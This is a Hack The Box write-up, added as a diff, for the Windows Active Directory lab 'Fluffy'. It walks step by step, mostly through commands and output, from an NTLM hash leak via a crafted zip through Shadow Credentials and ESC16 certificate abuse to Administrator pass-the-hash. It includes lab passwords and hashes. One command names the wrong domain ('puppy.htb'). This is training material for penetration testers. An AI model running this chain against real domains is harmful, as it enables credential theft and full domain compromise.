@@ -1,0 +1,158 @@
+Title: Fluffy
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Fluffy was a Windows Active Directory box, starting from a set of valid low-privilege domain credentials (`j.fleischman`) handed out up front. An SMB share held a PDF referencing several recent CVEs, one of which, a Windows Explorer NTLM-leak vulnerability triggered by extracting a crafted `.library-ms` file from a zip archive, was used to capture another user's NTLMv2 hash by planting a malicious archive on the share and listening with Responder. That hash cracked to a usable password, and BloodHound revealed a chain of nested ACL abuse: the compromised account had GenericAll over a "Service Accounts" management group, which itself had GenericWrite over three actual service accounts, one of which was a member of Remote Management Users. Shadow Credentials attacks against first that WinRM-enabled service account, then the CA service account, extracted both accounts' NT hashes without ever resetting a password. The CA account's own rights were then used to abuse ESC16, an AD CS misconfiguration where the Certificate Authority has its Security Extension disabled globally, allowing a certificate to be issued that authenticated as the domain Administrator.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.69
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+```
+
+The service scan confirmed a Windows domain controller, `DC01.fluffy.htb`, for the `fluffy.htb` domain. The provided credentials were validated first with a quick SMB auth check:
+
+```
+> nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' -d fluffy.htb
+[+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
+```
+
+## Domain Enumeration
+
+`enum4linux -a` as `j.fleischman` enumerated the domain's users, groups, and shares. Notable accounts included `ca_svc`, `ldap_svc`, `winrm_svc`, `p.agila`, and `j.coffey`. Two custom groups stood out: `Service Account Managers`, containing `p.agila` and `j.coffey`, and `Service Accounts`, containing `ca_svc`, `ldap_svc`, and `winrm_svc`. Share enumeration listed a non-default `IT` share alongside the default `NETLOGON` and `SYSVOL` shares, which `j.fleischman` could access.
+
+## SMB Share - Discovering a CVE Reference
+
+Connecting to the `IT` share with `smbclient` and downloading `Upgrade_Notice.pdf` revealed a document referencing a list of CVEs relevant to the environment. The second one listed was a match for the box, a Windows Explorer NTLM hash leak vulnerability triggered by extracting a specially crafted `.library-ms` file bundled inside a zip archive, with a public proof-of-concept available (`CVE-2025-24071_PoC`). The presence of two copies of similar files on the share hinted that whatever was uploaded there would likely get extracted automatically by another user or process.
+
+## Foothold - NTLM Hash Capture via CVE-2025-24071
+
+The PoC was used to generate a malicious zip archive containing a crafted `.library-ms` file pointed at the attacking machine. With `responder` listening for inbound authentication, the resulting `exploit.zip` (renamed `test.zip`) was uploaded to the `IT` share:
+
+```
+> sudo responder -I tun0 -v
+> smbclient '//10.10.11.69/IT' -U 'j.fleischman%J0elTHEM4n1990!'
+> put test.zip
+```
+
+Once the archive was extracted on the other end, Windows Explorer's handling of the embedded `.library-ms` reference triggered an outbound SMB authentication attempt back to the attacking host, and Responder captured an NTLMv2 hash for a second domain user:
+
+```
+NTLMv2-SSP Username : FLUFFY\p.agila
+NTLMv2-SSP Hash     : p.agila::FLUFFY:...
+```
+
+## Cracking p.agila's Hash
+
+The captured hash cracked quickly against rockyou.txt:
+
+```
+> hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+p.agila:prometheusx-303
+```
+
+## BloodHound - Nested ACL Abuse Chain
+
+Running `bloodhound-python` as `p.agila` and reviewing the resulting graph showed a chained privilege escalation path: `p.agila`, as a member of `Service Account Managers`, held **GenericAll** over the `Service Accounts` group, which in turn held **GenericWrite** over each of its members (`ca_svc`, `ldap_svc`, `winrm_svc`). `winrm_svc` was additionally a member of `Remote Management Users`, making it a direct path to WinRM access.
+
+`p.agila` was first added into the `Service Accounts` group to directly inherit its GenericWrite rights over the service accounts:
+
+```
+> bloodyAD --host 10.10.11.69 -d "puppy.htb" -u p.agila -p 'prometheusx-303' add groupMember "SERVICE ACCOUNTS" "p.agila"
+```
+
+## Shadow Credentials - winrm_svc
+
+With GenericWrite over `winrm_svc`, a Shadow Credentials attack was run with Certipy to add a certificate-backed Key Credential and retrieve its NT hash directly, without touching its actual password:
+
+```
+> certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
+Got hash: 33bd09dcd697600edf6b3a7af4875767
+```
+
+This hash authenticated over WinRM immediately:
+
+```
+> evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+```
+
+This granted a shell and the user flag.
+
+## Shadow Credentials - ca_svc via PKINIT
+
+The same GenericWrite rights extended from `winrm_svc` onto `ca_svc`, the certificate authority's service account, which was a more valuable target given its likely rights over AD CS. `pywhisker` was used to add a Shadow Credential to `ca_svc`, producing a PFX certificate and password:
+
+```
+> python pywhisker.py -d fluffy.htb -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767' --target ca_svc --action add --dc-ip 10.10.11.69
+[+] Saved PFX certificate & key at path: 5CbW065Y.pfx
+[*] Must be used with password: PoKZ3LEGp021SgPKR2qz
+```
+
+That certificate was used to request a Kerberos TGT for `ca_svc` via PKINIT, which also yielded the account's AS-REP encryption key:
+
+```
+> python gettgtpkinit.py -cert-pfx 5CbW065Y.pfx -pfx-pass PoKZ3LEGp021SgPKR2qz -dc-ip 10.10.11.69 fluffy.htb/ca_svc ca_svc.ccache
+```
+
+With the TGT cached and the AS-REP key in hand, `ca_svc`'s NT hash was derived directly:
+
+```
+> export KRB5CCNAME=$(pwd)/ca_svc.ccache
+> python getnthash.py -key <AS-REP key> fluffy.htb/ca_svc
+Recovered NT Hash: ca0f4f9e9eb8a092addf53bb03fc98c8
+```
+
+## AD CS Abuse - ESC16 (Security Extension Disabled)
+
+With `ca_svc` credentials, `certipy find` was run against the CA to check for known AD CS misconfigurations and flagged **ESC16**: the Certificate Authority had its Security Extension disabled globally, meaning issued certificates would not embed the requester's SID, so authentication would fall back to matching on UPN alone.
+
+Since `winrm_svc` (through the earlier GenericWrite chain) had rights to modify `ca_svc`'s account, its `userPrincipalName` was updated to impersonate the domain Administrator:
+
+```
+> certipy account -u 'winrm_svc@fluffy.htb' -hashes '33bd09dcd697600edf6b3a7af4875767' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
+```
+
+A certificate was then requested as `ca_svc` (now carrying the Administrator UPN) using Kerberos authentication against the CA's default `User` template:
+
+```
+> certipy req -k -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+[*] Got certificate with UPN 'administrator'
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+`ca_svc`'s `userPrincipalName` was then reverted back to its original value to avoid leaving the account in a broken state. Authenticating with the issued certificate, which the CA's disabled Security Extension allowed to map purely by UPN, retrieved the domain Administrator's NT hash:
+
+```
+> certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+```
+
+## Domain Admin - Pass-the-Hash
+
+```
+> evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+```
+
+This completed the domain compromise with a shell as Administrator.
+
+## Takeaways
+
+- Files sitting on internal shares are worth reading even when they look purely administrative. A PDF referencing patch notes or CVEs can directly point to the exact vulnerability the environment is exposed to.
+- Windows Explorer's handling of certain file types bundled inside zip archives, such as the `.library-ms` NTLM leak covered by CVE-2025-24071, can be weaponized to force a victim's machine to authenticate to an attacker-controlled listener the moment the archive is extracted or previewed.
+- Nested group-based ACL chains (a management group with GenericAll over a service-account group, which itself has GenericWrite over its members) are exactly what BloodHound is built to surface, and following the chain step by step, rather than looking for a single direct edge, is often what unlocks the actual escalation path.
+- Shadow Credentials attacks let an attacker with GenericWrite/GenericAll over an account recover its NT hash via a certificate-backed Key Credential and PKINIT authentication, without ever needing to reset the account's password.
+- ESC16 (a Certificate Authority with its Security Extension disabled globally) means issued certificates aren't strongly bound to the requester's SID, so an attacker who can modify a certificate-eligible account's `userPrincipalName` can effectively request a certificate that authenticates as a completely different, more privileged account.
